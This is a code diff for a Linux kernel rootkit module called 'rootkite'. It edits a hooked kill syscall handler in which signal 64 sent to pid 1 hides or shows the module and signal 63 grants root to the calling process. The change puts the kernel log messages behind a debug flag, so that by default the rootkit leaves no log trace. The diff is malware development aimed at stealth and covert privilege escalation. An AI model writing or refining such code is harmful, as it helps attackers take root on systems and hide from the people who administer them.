@@ -14,11 +14,15 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
     if ((sig == 64) && (pid == 1))
     {
         if(hidden == 0){
-            pr_info("Hide rootkite\n");
+#ifdef KITE_DEBUG
+			pr_info("Hide rootkite\n");
+#endif
             hide_mod();
         }
         else{
-            pr_info("Show rootkite\n");
+#ifdef KITE_DEBUG
+			pr_info("Show rootkite\n");
+#endif
             show_mod();
         }
     }
@@ -27,7 +31,9 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
-        pr_info("Setting root for calling process\n");
+#ifdef KITE_DEBUG
+		pr_info("Setting root for calling process\n");
+#endif
         set_root();
         return 0;
     }
@@ -38,11 +44,15 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
     if ((sig == 64) && (pid == 1))
     {
         if(hidden == 0){
-            pr_info("Hide rootkite\n");
+#ifdef KITE_DEBUG
+			pr_info("Hide rootkite\n");
+#endif
             hide_mod();
         }
         else{
-            pr_info("Show rootkite\n");
+#ifdef KITE_DEBUG
+			pr_info("Show rootkite\n");
+#endif
             show_mod();
         }
     }
@@ -51,7 +61,9 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
-        pr_info("Setting root for calling process\n");
+#ifdef KITE_DEBUG
+		pr_info("Setting root for calling process\n");
+#endif
         set_root();
         return 0;
     }
